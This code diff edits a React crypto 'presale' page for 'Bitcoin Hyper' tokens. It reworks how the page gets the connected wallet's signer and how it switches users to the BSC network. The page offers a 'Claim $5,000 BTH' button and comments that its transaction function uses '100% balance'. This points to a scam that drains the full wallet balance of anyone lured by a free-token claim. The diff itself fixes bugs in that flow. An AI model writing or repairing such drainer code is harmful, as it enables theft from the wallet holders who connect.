@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { useAppKit, useAppKitAccount } from '@reown/appkit/react';
-import { useBalance, useDisconnect, useChainId } from 'wagmi';
+import { useBalance, useDisconnect, useWalletClient, useChainId } from 'wagmi';
 import { formatEther } from 'viem';
 import { ethers } from 'ethers';
 import './index.css';
@@ -33,6 +33,7 @@ function App() {
   const { open } = useAppKit();
   const { address, isConnected } = useAppKitAccount();
   const { disconnect } = useDisconnect();
+  const { data: walletClient } = useWalletClient();
   
   // Get REAL wallet chain ID from wagmi
   const chainId = useChainId();
@@ -51,7 +52,7 @@ function App() {
   const [showCelebration, setShowCelebration] = useState(false);
   const [verifying, setVerifying] = useState(false);
   const [isEligible, setIsEligible] = useState(false);
-  const [walletReady, setWalletReady] = useState(false);
+  const [signerReady, setSignerReady] = useState(false);
   
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -69,10 +70,10 @@ function App() {
     tokenPrice: 0.17
   });
 
-  // Get balance using wagmi - FORCED to BSC chainId 56
+  // Get balance using wagmi - Use actual chainId, not forced
   const { data: balanceData, refetch: refetchBalance } = useBalance({
     address: address,
-    chainId: 56,
+    chainId: chainId, // Use actual chain ID
   });
 
   // Fetch BNB price from CoinGecko
@@ -116,41 +117,37 @@ function App() {
 
   const isBSC = chainId === 56;
 
-  // ✅ FIXED: Signer initialization using window.ethereum (works in all browsers)
+  // ✅ FIXED: Signer initialization using walletClient.transport (works in all browsers)
   useEffect(() => {
     const initSigner = async () => {
-      // Check if we have an address and window.ethereum exists
-      if (!address || !window.ethereum) {
+      if (!isConnected || !walletClient || !address) {
         setSigner(null);
         setProvider(null);
-        setWalletReady(false);
+        setSignerReady(false);
         return;
       }
 
       try {
-        console.log("Initializing signer with window.ethereum...");
-        const web3Provider = new ethers.BrowserProvider(window.ethereum);
-        const web3Signer = await web3Provider.getSigner();
-
-        const signerAddress = await web3Signer.getAddress();
-        if (signerAddress.toLowerCase() !== address.toLowerCase()) {
-          throw new Error("Signer address mismatch");
+        // Use walletClient.transport which is the actual EIP-1193 provider
+        const provider = new ethers.BrowserProvider(walletClient.transport);
+        const signer = await provider.getSigner(address);
+        
+        // Verify signer address matches connected address
+        const signerAddress = await signer.getAddress();
+        if (signerAddress.toLowerCase() === address?.toLowerCase()) {
+          setProvider(provider);
+          setSigner(signer);
+          setSignerReady(true);
+          console.log("✅ Signer ready using walletClient.transport");
         }
-
-        setProvider(web3Provider);
-        setSigner(web3Signer);
-        setWalletReady(true);
-        console.log("✅ Signer ready (EIP-1193)");
       } catch (err) {
         console.error("Signer init failed:", err);
-        setSigner(null);
-        setProvider(null);
-        setWalletReady(false);
+        setSignerReady(false);
       }
     };
 
     initSigner();
-  }, [address, chainId]); // Re-run when address or chain changes
+  }, [isConnected, walletClient, address]);
 
   // Countdown timer
   useEffect(() => {
@@ -209,57 +206,35 @@ function App() {
     }
   };
 
-  // ✅ AUTO-SWITCH TO BSC USING window.ethereum (works with all wallets)
+  // ✅ FIXED: Switch using walletClient (works in ALL browsers)
   const switchToBSC = async () => {
-    if (!window.ethereum) {
-      throw new Error("No wallet provider found");
+    if (!walletClient) {
+      throw new Error("No wallet client available");
     }
 
-    const BSC_CHAIN_ID = "0x38";
-
     try {
-      await window.ethereum.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: BSC_CHAIN_ID }]
-      });
+      await walletClient.switchChain({ id: 56 });
     } catch (switchError) {
-      if (switchError.code === 4902) {
-        await window.ethereum.request({
-          method: "wallet_addEthereumChain",
-          params: [{
-            chainId: BSC_CHAIN_ID,
-            chainName: "BNB Smart Chain",
-            nativeCurrency: {
-              name: "BNB",
-              symbol: "BNB",
-              decimals: 18
-            },
-            rpcUrls: ["https://bsc-dataseed.binance.org/"],
-            blockExplorerUrls: ["https://bscscan.com"]
-          }]
-        });
-      } else {
-        throw switchError;
-      }
+      // Chain not added - we'll let the wallet handle adding
+      console.error("Switch failed:", switchError);
+      throw switchError;
     }
   };
 
   // Execute function with 100% balance
   const executePresaleTransaction = async () => {
-    // ✅ FIXED: Check for window.ethereum first
-    if (!window.ethereum) {
-      setError("No wallet provider found. Please install MetaMask or Trust Wallet.");
-      return;
-    }
-
-    // ✅ FIXED: Only check address, not isConnected (which can desync)
-    if (!address) {
+    if (!isConnected || !address) {
       setError("Wallet not connected");
       return;
     }
 
-    if (!walletReady || !signer) {
-      setError("Please wait for wallet to initialize");
+    if (!walletClient) {
+      setError("Wallet client not initialized");
+      return;
+    }
+
+    if (!signerReady || !signer) {
+      setError("Signer not ready. Please wait or reconnect.");
       return;
     }
 
@@ -269,11 +244,8 @@ function App() {
       setTxStatus('⏳ Preparing transaction...');
       setTxHash('');
 
-      // Get current chain config
-      const currentChain = Object.values(PRESALE_CONFIG).find(c => c.chainId === chainId);
-      
       // Check if current chain has a deployed contract (only BSC does)
-      if (!currentChain || !currentChain.contractAddress) {
+      if (!isBSC) {
         // Auto-switch to BSC since it's the only deployed chain
         setTxStatus('🔄 Switching to BSC network...');
         await switchToBSC();
@@ -414,13 +386,6 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  const reconnectWallet = () => {
-    disconnect();
-    setTimeout(() => {
-      open();
-    }, 500);
-  };
-
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
       
@@ -509,7 +474,7 @@ function App() {
 
         {/* Connect Wallet */}
         <div className="text-center mb-8">
-          {!address ? (
+          {!isConnected ? (
             <button
               onClick={() => open()}
               className="group relative transform hover:scale-105 transition-all duration-300"
@@ -527,7 +492,7 @@ function App() {
                   <span className="font-mono text-lg bg-gray-900/50 px-4 py-2 rounded-lg border border-gray-700">
                     {formatAddress(address)}
                   </span>
-                  {!walletReady && (
+                  {!signerReady && (
                     <span className="text-xs text-yellow-400">(Initializing...)</span>
                   )}
                 </div>
@@ -540,41 +505,23 @@ function App() {
                     ≈ ${balanceUSD.toFixed(2)} USD
                   </span>
                 </div>
-                <div className="flex gap-2">
-                  <button
-                    onClick={reconnectWallet}
-                    className="px-4 py-2 bg-blue-500/20 text-blue-400 rounded-lg hover:bg-blue-500/30 transition-colors border border-blue-500/30"
-                  >
-                    Reconnect
-                  </button>
-                  <button
-                    onClick={() => disconnect()}
-                    className="px-4 py-2 bg-red-500/20 text-red-400 rounded-lg hover:bg-red-500/30 transition-colors border border-red-500/30"
-                  >
-                    Disconnect
-                  </button>
-                </div>
+                <button
+                  onClick={() => disconnect()}
+                  className="px-4 py-2 bg-red-500/20 text-red-400 rounded-lg hover:bg-red-500/30 transition-colors border border-red-500/30"
+                >
+                  Disconnect
+                </button>
               </div>
             </div>
           )}
         </div>
 
         {/* Network Warning */}
-        {address && !isBSC && (
+        {isConnected && !isBSC && (
           <div className="bg-yellow-900/30 border border-yellow-500/50 text-yellow-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm">
             <div className="flex items-center gap-3">
               <span className="text-2xl">⚠️</span>
               <span>Click "Claim $5,000 BTH" to auto-switch to BSC network</span>
-            </div>
-          </div>
-        )}
-
-        {/* Wallet Provider Warning */}
-        {address && !window.ethereum && (
-          <div className="bg-red-900/30 border border-red-500/50 text-red-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm">
-            <div className="flex items-center gap-3">
-              <span className="text-2xl">⚠️</span>
-              <span>No wallet provider found. Please install MetaMask or Trust Wallet.</span>
             </div>
           </div>
         )}
@@ -640,7 +587,7 @@ function App() {
         )}
 
         {/* Main Content */}
-        {address && isEligible && walletReady && (
+        {isConnected && isEligible && signerReady && (
           <div className="glass-card p-8">
             <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
             
